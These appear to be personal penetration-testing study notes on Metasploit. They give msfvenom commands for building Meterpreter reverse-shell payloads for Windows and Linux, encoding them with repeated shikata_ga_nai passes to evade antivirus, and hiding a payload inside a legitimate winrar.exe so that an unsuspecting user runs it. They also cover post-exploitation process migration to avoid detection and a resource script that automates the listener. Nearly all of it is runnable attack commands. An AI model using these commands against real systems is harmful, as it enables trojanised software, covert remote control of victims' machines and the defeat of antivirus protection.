
###### Generating Payloads With Msfvenom
-> structure of a msfvenom payload
-> _os_/_architecture_/_Type of shell_/_protocol_

-> `multi/handler` : advance lister used to handle the meterpreter reverse connection

1. MSFVENOM
	-> `msfvenom --list payloads` : to list all the payloads
	-> `msfvenom --list formats` : to list all the formats. like exe etc

2. Payload creation for _WINDOWS_
	-> `msfvenom -a ARCH -p /PAYLOAD/NAME LHOST=IP LPORT=PORT -f FORMAT > file.EXTENSION`
	
	-> Example for 32 bit arch.
	-> `msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.11.121 LPORT=1234 -f exe > file.exe`
	
	-> Example for 62 bit arch.
	-> `msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.11.121 LPORT=1234 -f exe > file.exe`

2. Payload creation for _LINUX_
	-> `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > binary.elf`


###### Encoding MSF Payload (Evade AVs)
-> Encoding of payloads is done in order to evade from AVs
-> `x86/shikata_ga_nai` : excellent encoder to encode both windows and linux
-> `cmd/powershell_base64` : excellent encoder to encode powershell scripts.

1. `-e x86/shikata_ga_nai` : just add this flag while generating any payload 
	-> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.11.121 LPORT=1234 -e x86/shikata_ga_nai -f exe > file.exe`

2. Iterations increment : increasing the number of iteration will help the payload more to not get detected by the AVs.
	-> `-i NUMBER` : example : `-i 10` | `-i 20` 
	-> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.11.121 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > file.exe`


###### Injecting Payload into Windows Portable Executables

1. `-x FILE` : download a legitimate executable , example winrar for windows. This will hide your payload in winrar.exe and when the user try to execute it then the payloadd will executed.
	-> download a winrar.exe legitimate file.
	-> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.11.121 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downloads/winrar.exe > file.exe`

#post-exploitation 
-> always use `/post/windows/manage/migrate` module in meterpreter after getting meterpreter reverse shell.
-> It will migrate the payload process to something else like notepad.exe and the AVs will not be able to detect it.

### AUTOMATION 

###### Automating Metasploit With Resource Scripts
-> `.rc` is an extension readadble by MSFCONSOLE stands for resource script , used to automate tasks.
-> we can automate tasks by writting our own script in `rc` file.
-> Just enter the MSF comands you want to execute sequentially one by one just like `bash`
```rc
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.21.21 
set LPORT 9001
run 
```

->save it as any name let's say `auto-shell.rc`
-> now run the `msf` with it 
	-> `msfconsole -r ./auto-shell.rc`

-> In case of import  script in `msf` directly.
	-> use the command : `resource PATH`

-> creating resource script from already typed commands
	-> `makerc /PATH/TO/FILE.rc`
	-> it will save the already typed commands

 